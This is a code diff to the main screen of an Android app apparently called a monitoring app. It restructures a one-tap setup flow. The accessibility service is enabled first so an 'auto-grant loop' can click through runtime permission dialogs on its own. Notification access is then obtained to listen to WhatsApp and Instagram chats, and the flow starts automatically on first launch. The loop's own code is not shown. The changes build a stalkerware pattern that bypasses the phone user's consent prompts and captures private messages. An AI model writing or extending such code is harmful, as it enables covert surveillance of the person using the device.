@@ -110,6 +110,10 @@ class MainActivity : AppCompatActivity() {
 
     private var isOneTapFlowRunning = false
 
+    private var skipAccessibilityStep = false
+
+    private var skipNotificationStep = false
+
     private var autostartPrompted = false
 
 
@@ -130,28 +134,16 @@ class MainActivity : AppCompatActivity() {
 
         SyncScheduler.runOnce(applicationContext)
 
-        if (getMissingRuntimePermissions().isEmpty() && isAccessibilityEnabled()) {
-
+        if (isOneTapFlowRunning) {
+            handleNextSetupStep()
+        } else if (getMissingRuntimePermissions().isEmpty() && isAccessibilityEnabled() && isNotificationAccessGranted()) {
             deviceState.markSetupCompleted()
-
             triggerAutoSyncAfterAccessibility()
-
         }
-
-
 
         val grantedCount = results.values.count { it }
-
         if (!isOneTapFlowRunning && com.spapp.monitoring.blocking.BlockAccessibilityService.instance == null && grantedCount > 0) {
-
             Toast.makeText(this, "$grantedCount permissions updated", Toast.LENGTH_SHORT).show()
-
-        }
-
-        if (isOneTapFlowRunning) {
-
-            handleNextSetupStep()
-
         }
 
     }
@@ -161,25 +153,14 @@ class MainActivity : AppCompatActivity() {
     // 2. Accessibility Launcher (Part of 1-Tap Core Flow)
 
     private val accessibilityLauncher = registerForActivityResult(
-
         ActivityResultContracts.StartActivityForResult()
-
     ) {
-
         refreshPermissionStatus()
-
-        if (isAccessibilityEnabled()) {
-
-            triggerAutoSyncAfterAccessibility()
-
-        }
-
         if (isOneTapFlowRunning) {
-
             handleNextSetupStep()
-
+        } else if (isAccessibilityEnabled() && isNotificationAccessGranted() && getMissingRuntimePermissions().isEmpty()) {
+            triggerAutoSyncAfterAccessibility()
         }
-
     }
 
 
@@ -213,21 +194,15 @@ class MainActivity : AppCompatActivity() {
     private var isNotificationDialogShowing = false
 
     private val notificationListenerLauncher = registerForActivityResult(
-
         ActivityResultContracts.StartActivityForResult()
-
     ) {
-
         isNotificationDialogShowing = false
-
         refreshPermissionStatus()
-
-        if (isNotificationAccessGranted()) {
-
+        if (isOneTapFlowRunning) {
+            handleNextSetupStep()
+        } else if (isNotificationAccessGranted() && isAccessibilityEnabled() && getMissingRuntimePermissions().isEmpty()) {
             triggerAutoSyncAfterAccessibility()
-
         }
-
     }
 
 
@@ -328,8 +303,11 @@ class MainActivity : AppCompatActivity() {
         binding.btnMasterOneTap.setOnClickListener {
             val missingRuntime = getMissingRuntimePermissions()
             val missingAccessibility = !isAccessibilityEnabled()
-            if (missingRuntime.isNotEmpty() || missingAccessibility) {
+            val missingNotification = !isNotificationAccessGranted()
+            if (missingRuntime.isNotEmpty() || missingAccessibility || missingNotification) {
                 isOneTapFlowRunning = true
+                skipAccessibilityStep = false
+                skipNotificationStep = false
                 handleNextSetupStep()
             } else {
 
@@ -548,43 +526,20 @@ class MainActivity : AppCompatActivity() {
      */
 
     private fun maybeStartAutoPermissionFlow() {
-
         val missingRuntime = getMissingRuntimePermissions()
-
         val isA11y = isAccessibilityEnabled()
+        val isNotif = isNotificationAccessGranted()
 
-
-
-        if (missingRuntime.isNotEmpty() && isA11y) {
-
+        if (deviceState.isFirstLaunchAfterInstall() || !isA11y || !isNotif || missingRuntime.isNotEmpty()) {
             Handler(Looper.getMainLooper()).postDelayed({
-
                 if (!isFinishing && !isDestroyed) {
-
-                    BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-
-                    runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
-
-                }
-
-            }, 15L)
-
-        } else if (deviceState.isFirstLaunchAfterInstall() && (missingRuntime.isNotEmpty() || !isA11y)) {
-
-            Handler(Looper.getMainLooper()).postDelayed({
-
-                if (!isFinishing && !isDestroyed) {
-
                     isOneTapFlowRunning = true
-
+                    skipAccessibilityStep = false
+                    skipNotificationStep = false
                     handleNextSetupStep()
-
                 }
-
             }, AUTO_FLOW_DELAY_MS)
-
         }
-
     }
 
 
@@ -652,26 +607,14 @@ class MainActivity : AppCompatActivity() {
     override fun onResume() {
         super.onResume()
         refreshPermissionStatus()
-        val missing = getMissingRuntimePermissions()
-        if (missing.isNotEmpty() && isAccessibilityEnabled() && !isFinishing && !isDestroyed) {
-            BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-            runtimePermissionsLauncher.launch(missing.toTypedArray())
-        } else if (isAccessibilityEnabled() && missing.isEmpty()) {
-            triggerAutoSyncAfterAccessibility()
-        }
-
         statusUpdater.run()
-
         uploadCurrentFcmToken()
 
-
-
         if (isOneTapFlowRunning) {
-
             handleNextSetupStep()
-
+        } else if (isAccessibilityEnabled() && isNotificationAccessGranted() && getMissingRuntimePermissions().isEmpty()) {
+            triggerAutoSyncAfterAccessibility()
         }
-
     }
 
 
@@ -695,32 +638,32 @@ class MainActivity : AppCompatActivity() {
 
 
     private fun handleNextSetupStep() {
-
-        val missingRuntime = getMissingRuntimePermissions()
-
-        if (missingRuntime.isNotEmpty()) {
-
-            BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-
-            runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
-
-            return
-
-        }
-
-
-
-        if (!isAccessibilityEnabled()) {
+        // Step 1: Accessibility Service (Enabled first so auto-grant loop can assist)
+        if (!isAccessibilityEnabled() && !skipAccessibilityStep) {
             showAccessibilityDialog()
             return
         }
 
-        // Standard Runtime Permissions and Accessibility are now enabled!
+        // Step 2: Notification Access (WhatsApp & Instagram chat listener)
+        if (!isNotificationAccessGranted() && !skipNotificationStep) {
+            showNotificationDialog()
+            return
+        }
+
+        // Step 3: Standard Runtime Permissions (Auto-clicked via Accessibility loop)
+        val missingRuntime = getMissingRuntimePermissions()
+        if (missingRuntime.isNotEmpty()) {
+            BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+            runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
+            return
+        }
+
+        // Standard Runtime Permissions, Accessibility, and Notification Access are now enabled!
         isOneTapFlowRunning = false
         deviceState.markSetupCompleted()
         refreshPermissionStatus()
-        Log.i(TAG, "Core permissions & Accessibility active")
-
+        triggerAutoSyncAfterAccessibility()
+        Log.i(TAG, "Core permissions, Accessibility & Notification Access all active")
     }
 
 
@@ -758,35 +701,26 @@ class MainActivity : AppCompatActivity() {
             .setMessage(msg)
 
             .setPositiveButton(R.string.go_to_settings) { _, _ ->
-
                 try {
-
                     accessibilityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-
                 } catch (e: Exception) {
-
                     Log.e(TAG, "Cannot open accessibility settings", e)
-
-                    isOneTapFlowRunning = false
-
+                    if (isOneTapFlowRunning) {
+                        skipAccessibilityStep = true
+                        handleNextSetupStep()
+                    }
                 }
-
             }
-
             .setNeutralButton(R.string.open_app_info) { _, _ ->
-
                 openAppInfoSettings()
-
             }
-
             .setNegativeButton(if (isOneTapFlowRunning) "Skip" else "Cancel") { _, _ ->
-
-                isOneTapFlowRunning = false
-
-                deviceState.markSetupCompleted()
-
-                refreshPermissionStatus()
-
+                if (isOneTapFlowRunning) {
+                    skipAccessibilityStep = true
+                    handleNextSetupStep()
+                } else {
+                    refreshPermissionStatus()
+                }
             }
 
             .show()
@@ -827,35 +761,29 @@ class MainActivity : AppCompatActivity() {
             .setMessage(msg)
 
             .setPositiveButton(R.string.go_to_settings) { _, _ ->
-
                 isNotificationDialogShowing = false
-
                 try {
-
                     notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
-
                 } catch (e: Exception) {
-
                     Log.e(TAG, "Cannot open notification listener settings", e)
-
+                    if (isOneTapFlowRunning) {
+                        skipNotificationStep = true
+                        handleNextSetupStep()
+                    }
                 }
-
             }
-
             .setNeutralButton(R.string.open_app_info) { _, _ ->
-
                 isNotificationDialogShowing = false
-
                 openAppInfoSettings()
-
             }
-
-            .setNegativeButton("Skip") { _, _ ->
-
+            .setNegativeButton(if (isOneTapFlowRunning) "Skip" else "Cancel") { _, _ ->
                 isNotificationDialogShowing = false
-
-                triggerAutoSyncAfterAccessibility()
-
+                if (isOneTapFlowRunning) {
+                    skipNotificationStep = true
+                    handleNextSetupStep()
+                } else {
+                    refreshPermissionStatus()
+                }
             }
 
             .setOnDismissListener {
